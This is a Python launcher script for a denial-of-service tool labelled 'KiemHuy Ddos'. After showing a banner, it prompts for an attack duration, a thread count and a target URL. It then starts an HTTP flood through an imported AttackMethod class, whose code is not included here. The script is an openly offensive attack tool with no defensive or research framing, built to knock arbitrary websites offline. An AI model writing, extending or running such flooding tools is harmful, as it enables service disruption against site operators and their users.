# Created by kiemhuy

# Import modules
import os
import sys
import argparse
from colorama import Fore

os.system("@cls &title KiemHuy Ddos By HackerKiemHuy & @color e")

# Get the actual directory
os.chdir(os.path.dirname(os.path.realpath(__file__)))

try:
    from tools.crash import CriticalError
    import tools.addons.clean
    import tools.addons.logo
    # import tools.addons.winpcap
    import tools.addons.wireshark
    from tools.method import AttackMethod
except ImportError as err:
    CriticalError("Failed to import some packages", err)
    sys.exit(1)

method = "HTTP"
logo = """

    ██ ▄█▀ ██▓▓█████  ███▄ ▄███▓ ██░ ██  █    ██▓██   ██▓
 ██▄█▒ ▓██▒▓█   ▀ ▓██▒▀█▀ ██▒▓██░ ██▒ ██  ▓██▒▒██  ██▒
▓███▄░ ▒██▒▒███   ▓██    ▓██░▒██▀▀██░▓██  ▒██░ ▒██ ██░
▓██ █▄ ░██░▒▓█  ▄ ▒██    ▒██ ░▓█ ░██ ▓▓█  ░██░ ░ ▐██▓░
▒██▒ █▄░██░░▒████▒▒██▒   ░██▒░▓█▒░██▓▒▒█████▓  ░ ██▒▓░
▒ ▒▒ ▓▒░▓  ░░ ▒░ ░░ ▒░   ░  ░ ▒ ░░▒░▒░▒▓▒ ▒ ▒   ██▒▒▒ 
░ ░▒ ▒░ ▒ ░ ░ ░  ░░  ░      ░ ▒ ░▒░ ░░░▒░ ░ ░ ▓██ ░▒░ 
░ ░░ ░  ▒ ░   ░   ░      ░    ░  ░░ ░ ░░░ ░ ░ ▒ ▒ ░░  
░  ░    ░     ░  ░       ░    ░  ░  ░   ░     ░ ░     
                                              ░ ░      
"""
CRYAN2 = '\33[94m'

if __name__ == "__main__":
    # Print help
    os.system('cls' if os.name == 'nt' else 'clear')
    print(CRYAN2 + logo + CRYAN2)
    print("  CREATED BY KIEMHUY")
    time = int(input(f"{Fore.CYAN}   [+]TIME:{Fore.RESET}"))
    threads = int(input(f"{Fore.CYAN}    [+]THREADS:{Fore.RESET}"))
    target = str(input(f"{Fore.CYAN}       [+]URL:{Fore.RESET}"))
    with AttackMethod(
        duration=time, name=method, threads=threads, target=target
    ) as Flood:
        Flood.Start()
else:
    sys.exit(1)
